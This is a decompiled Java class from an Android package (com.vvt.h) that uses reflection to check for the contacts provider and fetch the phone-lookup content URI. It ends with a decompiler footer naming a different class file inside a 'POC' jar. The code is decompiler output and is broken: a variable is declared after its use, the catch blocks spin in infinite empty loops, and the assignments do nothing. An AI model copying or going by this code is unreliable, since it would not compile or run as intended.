package com.vvt.h;

import android.net.Uri;
import java.lang.reflect.Field;

class g
{
  private static Uri a(String paramString1, String paramString2)
  {
    try
    {
      localObject1 = Class.forName(paramString1);
      localObject1 = ((Class)localObject1).getDeclaredField(paramString2);
      localObject1 = ((Field)localObject1).get(null);
      localObject1 = (Uri)localObject1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool = f.a();
        if (bool) {}
        bool = false;
        Object localObject2 = null;
      }
    }
    return (Uri)localObject1;
  }
  
  private static boolean c()
  {
    boolean bool1 = false;
    String str = "android.provider.ContactsContract";
    try
    {
      Class.forName(str);
      bool1 = true;
    }
    catch (ClassNotFoundException localClassNotFoundException)
    {
      for (;;)
      {
        boolean bool2 = f.a();
        if (!bool2) {}
      }
    }
    return bool1;
  }
  
  private static Uri d()
  {
    return a("android.provider.ContactsContract$PhoneLookup", "CONTENT_FILTER_URI");
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/AppEngine1/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */